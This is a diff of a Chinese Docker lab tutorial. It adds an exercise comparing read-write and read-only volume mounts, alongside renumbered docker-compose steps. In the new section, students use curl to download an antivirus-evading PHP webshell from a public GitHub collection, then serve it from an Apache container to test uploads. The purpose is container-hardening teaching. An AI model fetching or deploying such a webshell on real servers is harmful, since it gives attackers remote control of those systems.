@@ -45,10 +45,12 @@ exit
 mkdir ~/nginx
 cd ~/nginx
 ```
-`vi Dockerfile`编辑文件,内容如下2行
+
+`vi Dockerfile`编辑文件,内容如下2行(可以用自己的编号替换user00)
+
 ```
 FROM nginx
-RUN echo '<h1>Hello, docker!</h1>' > /usr/share/nginx/html/index.html
+RUN echo '<h1>Hello, docker, I am user00!</h1>' > /usr/share/nginx/html/index.html
 ```
 
 退出vi ，执行
@@ -83,7 +85,7 @@ docker login   #按照提示输入用户名和密码
 
 docker tag user${ID}/nginx  USERID/nginx  #USERID请用hub.docker.com账号名替换
 
-docker push  USERID/nginx   #USERID请用hub.docker.com账号名替换
+docker push USERID/nginx   #USERID请用hub.docker.com账号名替换
 
 ```
 如果上传成功，在 http://hub.docker.com/u/USERID 处可以看到
@@ -129,12 +131,68 @@ docker run --rm -p 90${ID}:80 --name user${ID}ipdesc -d user${ID}/ipdesc
 docker container stop user${ID}ipdesc
 ```
 
-### 8. docker-compose 实验
+### 8. 只读目录映射实验
+
+实验内容：下载一个黑客程序（大马），对比文件目录映射 是否只读 的区别。
+
+#### 8.1 准备
+
+在自己目录下建立 phptest 目录，并改为所有人可以读写，下载一个大马php程序。
+
+```
+mkdir ~/phptest
+cd ~/phptest
+chmod a+rwx .
+curl https://raw.githubusercontent.com/tennc/webshell/master/www-7jyewu-cn/%E5%85%8D%E6%9D%80php%E5%A4%A7%E9%A9%AC.php > index.php
+```
+
+#### 8.2 读写映射执行
+
+启动container，并copy进去一个文件。
+
+```
+cd ~/phptest
+docker run -dit --name user${ID}php --rm -v $PWD:/var/www/html -p 90${ID}:80 php:apache
+docker cp index.php  user${ID}php:/
+```
+
+这时，使用PC机可以访问 http://x.x.x.x:9000 (IP请用服务器IP，9000最后2位用自己编号)，可以看到一个对web服务器的控制界面。
+
+向 /var/www/html /var/tmp 分别上传一个文件，上传文件可以正常进行。
+
+在服务器上执行：
+```
+ls -al ~/phptest
+
+docker diff user${ID}php 
+```
+
+第一个命令可以看到上传到 /var/www/html 的文件。
+
+第二个命令可以看到container启动后，相对image，修改了哪些文件。
+
+
+#### 8.3 只读映射执行
+```
+cd ~/phptest
+docker container stop user${ID}php
+docker run -dit --name user${ID}php --rm -v $PWD:/var/www/html:ro -p 90${ID}:80 php:apache
+```
+
+这时，使用PC机可以访问 http://x.x.x.x:9000 (IP请用服务器IP，9000最后2位用自己编号)，因为是只读映射，向 /var/www/html 上传文件会出现错误。
+
+执行以下命令停止php
+```
+docker container stop user${ID}php
+```
+
+
+### 9. docker-compose 实验
 
 实验来自 https://yeasy.gitbooks.io/docker_practice/content/compose/usage.html
 
 
-#### 8.1 建立目录
+#### 9.1 建立目录
 
 注意：因为docker-compose生成的container与目录名有关，为了互相不影响，采用不同的目录名
 
@@ -143,7 +201,7 @@ mkdir ~/compose${ID}
 cd ~/compose${ID}
 ```
 
-#### 8.2 编辑 app.py 文件
+#### 9.2 编辑 app.py 文件
 
 `vi app.py`，输入以下内容
 
@@ -163,7 +221,7 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", debug=True)
 ```
 
-#### 8.3 编辑 Dockerfile
+#### 9.3 编辑 Dockerfile
 
 `vi Dockerfile`，输入以下内容
 
@@ -175,7 +233,7 @@ RUN pip install redis flask
 CMD ["python", "app.py"]
 ```
 
-#### 8.4 编辑 docker-compose.yml
+#### 9.4 编辑 docker-compose.yml
 
 `vi docker-compose.yml`，输入以下内容：
 
@@ -198,7 +256,7 @@ services:
 
 使用上面的配置，redis 文件存放在 ~/redis 目录下，删除container，不会丢失。
 
-#### 8.5 运行
+#### 9.5 运行
 
 在当前目录下：
 ```
@@ -207,7 +265,7 @@ docker-compose up
 
 调试时，如果出错，最好用`docker-compose rm`删除已经建立的container，重新开始。
 
-#### 8.6 测试
+#### 9.6 测试
 
 使用PC机可以访问 http://x.x.x.x:9000 (IP请用服务器IP，9000最后2位用自己编号)，看到统计信息刷新一次加1。
 
@@ -215,7 +273,7 @@ docker-compose up
 
 CTRL-C可以终止。
 
-#### 8.7 正式运行
+#### 9.7 正式运行
 
 正式运行，可以用命令 docker-compose up -d 在后台执行。
 
